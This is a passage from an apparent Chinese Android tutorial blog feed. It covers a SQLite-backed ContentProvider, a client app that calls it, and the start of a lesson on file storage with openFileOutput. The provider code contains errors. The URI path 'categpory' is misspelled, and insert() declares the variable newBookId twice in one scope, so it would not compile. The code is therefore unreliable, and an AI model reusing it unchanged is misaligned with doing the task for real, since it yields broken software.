class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DatabaseProvider</span> <span class="keyword">extends</span> <span class="title">ContentProvider</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> BOOK_DIR = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> BOOK_ITEM = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CATEGORY_DIT = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CATEGROY_ITEM = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String AUTHORITY = <span class="string">"com.example.databasetest.provider"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> UriMatcher uriMatcher;</span><br><span class="line">    <span class="keyword">private</span> MyDatabaseHelper dbHelper;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        uriMatcher = <span class="keyword">new</span> UriMatcher(UriMatcher.NO_MATCH);</span><br><span class="line">        uriMatcher.addURI(AUTHORITY, <span class="string">"book"</span>, BOOK_DIR);</span><br><span class="line">        uriMatcher.addURI(AUTHORITY, <span class="string">"book/#"</span>, BOOK_ITEM);</span><br><span class="line">        uriMatcher.addURI(AUTHORITY, <span class="string">"categpory"</span>, CATEGORY_DIT);</span><br><span class="line">        uriMatcher.addURI(AUTHORITY, <span class="string">"category/#"</span>, CATEGROY_ITEM);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        dbHelper = <span class="keyword">new</span> MyDatabaseHelper(getContext(),<span class="string">"BookStore.db"</span>, <span class="keyword">null</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cursor <span class="title">query</span><span class="params">(Uri uri, String[] projection, String selection,</span></span></span><br><span class="line"><span class="function"><span class="params">                        String[] selectionArgs, String sortOrder)</span> </span>&#123;</span><br><span class="line">        SQLiteDatabase db = dbHelper.getReadableDatabase();</span><br><span class="line">        Cursor cursor = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">switch</span>(uriMatcher.match(uri))&#123;</span><br><span class="line">            <span class="keyword">case</span> BOOK_DIR:</span><br><span class="line">                cursor = db.query(<span class="string">"Book"</span>, projection, selection, selectionArgs, <span class="keyword">null</span>, <span class="keyword">null</span>, sortOrder);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> BOOK_ITEM:</span><br><span class="line">                String bookId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">                cursor = db.query(<span class="string">"Book"</span>, projection, <span class="string">"id=?"</span>, <span class="keyword">new</span> String[]&#123;bookId&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, sortOrder);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_DIT:</span><br><span class="line">                cursor = db.query(<span class="string">"Category"</span>, projection, selection, selectionArgs, <span class="keyword">null</span>, <span class="keyword">null</span>, sortOrder);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGROY_ITEM:</span><br><span class="line">                String categoryId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">                cursor = db.query(<span class="string">"Category"</span>, projection, <span class="string">"id=?"</span>, <span class="keyword">new</span> String[]&#123;categoryId&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, sortOrder);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cursor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Uri <span class="title">insert</span><span class="params">(Uri uri, ContentValues values)</span> </span>&#123;</span><br><span class="line">        SQLiteDatabase db = dbHelper.getWritableDatabase();</span><br><span class="line">        Uri uriReturn = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">switch</span> (uriMatcher.match(uri))&#123;</span><br><span class="line">            <span class="keyword">case</span> BOOK_DIR:</span><br><span class="line">            <span class="keyword">case</span> BOOK_ITEM:</span><br><span class="line">                <span class="keyword">long</span> newBookId = db.insert(<span class="string">"Book"</span>, <span class="keyword">null</span>, values);</span><br><span class="line">                uriReturn = Uri.parse(<span class="string">"content://"</span> + AUTHORITY + <span class="string">"/book/"</span> + newBookId);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_DIT:</span><br><span class="line">            <span class="keyword">case</span> CATEGROY_ITEM:</span><br><span class="line">                <span class="keyword">long</span> newBookId = db.insert(<span class="string">"Category"</span>, <span class="keyword">null</span>, values);</span><br><span class="line">                uriReturn = Uri.parse(<span class="string">"content://"</span> + AUTHORITY + <span class="string">"/category/"</span> + newBookId);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> uriReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">update</span><span class="params">(Uri uri, ContentValues values, String selection,</span></span></span><br><span class="line"><span class="function"><span class="params">                      String[] selectionArgs)</span> </span>&#123;</span><br><span class="line">        SQLiteDatabase db = dbHelper.getWritableDatabase();</span><br><span class="line">        <span class="keyword">int</span> updatedRows = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span>(uriMatcher.match(uri))&#123;</span><br><span class="line">            <span class="keyword">case</span> BOOK_DIR:</span><br><span class="line">                updatedRows = db.update(<span class="string">"Book"</span>, values, selection, selectionArgs);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> BOOK_ITEM:</span><br><span class="line">                String bookId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">                updatedRows = db.update(<span class="string">"Book"</span>, values, <span class="string">"id=?"</span>, <span class="keyword">new</span> String[]&#123;bookId&#125;);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_DIT:</span><br><span class="line">                updatedRows = db.update(<span class="string">"Category"</span>, values, selection, selectionArgs);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGROY_ITEM:</span><br><span class="line">                String categoryId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">                updatedRows = db.update(<span class="string">"Category"</span>, values, <span class="string">"id=?"</span>, <span class="keyword">new</span> String[]&#123;categoryId&#125;);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> updatedRows;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">delete</span><span class="params">(Uri uri, String selection, String[] selectionArgs)</span> </span>&#123;</span><br><span class="line">        SQLiteDatabase db = dbHelper.getWritableDatabase();</span><br><span class="line">        <span class="keyword">int</span> deletedRows = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span>(uriMatcher.match(uri))&#123;</span><br><span class="line">            <span class="keyword">case</span> BOOK_DIR:</span><br><span class="line">                deletedRows = db.delete(<span class="string">"Book"</span>, selection, selectionArgs);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> BOOK_ITEM:</span><br><span class="line">                String bookId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">                deletedRows = db.delete(<span class="string">"Book"</span>, <span class="string">"id=?"</span>, <span class="keyword">new</span> String[]&#123;bookId&#125;);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_DIT:</span><br><span class="line">                deletedRows = db.delete(<span class="string">"Category"</span>, selection, selectionArgs);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGROY_ITEM:</span><br><span class="line">                String categoryId = uri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">                deletedRows = db.delete(<span class="string">"Category"</span>, <span class="string">"id=?"</span>, <span class="keyword">new</span> String[]&#123;categoryId&#125;);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> deletedRows;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getType</span><span class="params">(Uri uri)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(uriMatcher.match(uri))&#123;</span><br><span class="line">            <span class="keyword">case</span> BOOK_DIR:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"vnd.android.cursor.dir/vnd.com.example.databasetest.provider.book"</span>;</span><br><span class="line">            <span class="keyword">case</span> BOOK_ITEM:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"vnd.android.cursor.item/vnd.com.example.databasetest.provider.book"</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGORY_DIT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"vnd.android.cursor.dir/vnd.com.example.databasetest.provider.category"</span>;</span><br><span class="line">            <span class="keyword">case</span> CATEGROY_ITEM:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"vnd.android.cursor.item/vnd.com.example.databasetest.provider.category"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在DatabaseTest这个项目就已经拥有了跨程序共享数据的功能了。</p><p>接着新建一个ProviderTest项目来访问数据：<br>修改布局：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/add"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"ADD"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/query"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"QUERY"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/update"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"UPDATE"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/delete"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"DELETE"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后修改代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String newId;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button add = (Button) findViewById(R.id.add);</span><br><span class="line">        add.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Uri uri = Uri.parse(<span class="string">"content://com.example.databasetest.provider/book"</span>);</span><br><span class="line">                ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">                values.put(<span class="string">"name"</span>, <span class="string">"A Clash of Kings"</span>);</span><br><span class="line">                values.put(<span class="string">"author"</span>, <span class="string">"George Martin"</span>);</span><br><span class="line">                values.put(<span class="string">"pages"</span>, <span class="number">1040</span>);</span><br><span class="line">                values.put(<span class="string">"price"</span>, <span class="number">22.85</span>);</span><br><span class="line">                Uri newUri = getContentResolver().insert(uri, values);</span><br><span class="line">                newId = newUri.getPathSegments().get(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Button update = (Button) findViewById(R.id.update);</span><br><span class="line">        update.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Uri uri = Uri.parse(<span class="string">"content://com.example.databasetest.provider/book/"</span>+ newId);</span><br><span class="line">                ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">                values.put(<span class="string">"name"</span>, <span class="string">"A Storm of Swords"</span>);</span><br><span class="line">                values.put(<span class="string">"author"</span>, <span class="string">"George Raymond Richard Martin"</span>);</span><br><span class="line">                values.put(<span class="string">"pages"</span>, <span class="number">1216</span>);</span><br><span class="line">                values.put(<span class="string">"price"</span>, <span class="number">24.05</span>);</span><br><span class="line">                getContentResolver().update(uri, values, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Button query = (Button) findViewById(R.id.query);</span><br><span class="line">        query.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Uri uri = Uri.parse(<span class="string">"content://com.example.databasetest.provider/book"</span>);</span><br><span class="line">                Cursor cursor = getContentResolver().query(uri, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (cursor.moveToFirst()) &#123;</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        String name = cursor.getString(cursor.getColumnIndex(<span class="string">"name"</span>));</span><br><span class="line">                        String author = cursor.getString(cursor.getColumnIndex(<span class="string">"author"</span>));</span><br><span class="line">                        <span class="keyword">int</span> pages = cursor.getInt(cursor.getColumnIndex(<span class="string">"pages"</span>));</span><br><span class="line">                        <span class="keyword">double</span> price = cursor.getDouble(cursor.getColumnIndex(<span class="string">"price"</span>));</span><br><span class="line">                        Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book name is "</span> + name);</span><br><span class="line">                        Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book author is "</span> + author);</span><br><span class="line">                        Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book pages is "</span> + pages);</span><br><span class="line">                        Log.d(<span class="string">"MainActivity"</span>, <span class="string">"book price is "</span> + price);</span><br><span class="line">                    &#125; <span class="keyword">while</span> (cursor.moveToNext());</span><br><span class="line">                &#125;</span><br><span class="line">                cursor.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Button delete = (Button) findViewById(R.id.delete);</span><br><span class="line">        delete.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Uri uri = Uri.parse(<span class="string">"content://com.example.databasetest.provider/book/"</span>+newId);</span><br><span class="line">                getContentResolver().delete(uri, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样即可完成跨程序的内容提供器的创建与操作了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Android权限分为2类：普通权限和危险权限。在Android6.0版及以上本引入了运行时权限，用户需要手动授予危险权限才能使用，并且一旦授权其对应权限组下其他权限也会被授权。</p><p>内容提供器提供了跨程序数据共享的功能，与数据库存储方式类似，可以使用增删改查四个功能，但其参数略有不同。</p><p>前文实践中在创建的内容提供器内部引入SQLite数据库的操作，并重写增删改查功能，以实现对外部程序共享数据的功能。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;内容提供器探究&quot;&gt;&lt;a href=&quot;#内容提供器探究&quot; class=&quot;headerlink&quot; title=&quot;内容提供器探究&quot;&gt;&lt;/a&gt;内容提供器探究&lt;/h1&gt;&lt;h2 id=&quot;内容提供器简介&quot;&gt;&lt;a href=&quot;#内容提供器简介&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Android-day5</title>
    <link href="https://nuoye-blog.github.io/2020/05/29/Android/Android-day5/"/>
    <id>https://nuoye-blog.github.io/2020/05/29/Android/Android-day5/</id>
    <published>2020-05-29T08:50:00.000Z</published>
    <updated>2020-05-29T08:50:33.290Z</updated>
    
    <content type="html"><![CDATA[<h1 id="持久化技术详解"><a href="#持久化技术详解" class="headerlink" title="持久化技术详解"></a>持久化技术详解</h1><h2 id="持久化技术简介"><a href="#持久化技术简介" class="headerlink" title="持久化技术简介"></a>持久化技术简介</h2><p>数据持久化就是指将那些内存中的瞬时数据保存到存储设备中，保证即使在手机或电脑关机的情况下，这些数据仍然不会丢失。</p><p>保存在内存中的数据是处于瞬时状态的，而保存在存储设备中的数据是处于持久状态的，持久化技术则提供了一种机制可以让数据再瞬时状态和持久状态之间进行转换。</p><p>Android系统中主要提供了3种方式用于简单地实现数据持久化功能，即文件存储、sharedPreference存储以及数据库存储。</p><h2 id="文件存储"><a href="#文件存储" class="headerlink" title="文件存储"></a>文件存储</h2><p>文件存储是Android中最基本的一种数据存储方式，它不对存储的内容进行任何的格式化处理，所有的数据都是原封不动地保存到文件当中的。</p><h3 id="将数据存储到文件中"><a href="#将数据存储到文件中" class="headerlink" title="将数据存储到文件中"></a>将数据存储到文件中</h3><p>Context类提供了一个openFileOutput()方法，可以用于将数据存储到指定的文件中。这个方法有两个参数，第一个是文件名（注意，不可以包含路径，默认都是存储到<code>/data/data/&lt;packagename&gt;/files/</code>目录下的），第二个超时的文件的操作模式，可选的有MODE_PRIVATE（默认的操作方式，为覆写模式）和MOD_APPEND（为追加模式）。</p><p>openFileOutput()方法返回的是一个FileOutputStream对象，得到这个对象之后就可以使用java流的方式将数据写到文件中了。</p><p>下面新建一个FilePersistenceTest项目，并添加EditText控件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/edit"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Type something here"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后修改MainActivity中的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> EditText edit;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        edit = (EditText) findViewById(R.id.edit);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        String inputText = edit.getText().toString();</span><br><span class="line">        save(inputText);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">(String inputText)</span></span>&#123;</span><br><span class="line">        FileOutputStream out = <span class="keyword">null</span>;</span><br><span class="line">        BufferedWriter writer = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            out = openFileOutput(<span class="string">"data"</span>, Context.MODE_PRIVATE);</span><br><span class="line">            writer = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> OutputStreamWriter(out));</span><br><span class="line">            writer.write(inputText);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(writer != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样在活动销毁前就可以保存数据到data文件中了。</p><h2 id="从文本中读取数据"><a href="#从文本中读取数据" class="headerlink" title="从文本中读取数据"></a>从文本中读取数据</h2><p>Context类还提供了openFileInput()方法，用于从文件中读取数据。它只接收一个参数，即要读取的文件名，然后系统会自动到<code>/data/data/&lt;packagename&gt;/files/</code>目录下去加载这个文件，并返回一个FileInputStram对象。</p><p>继续完善代码使得重启后能够保留上次输入的内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 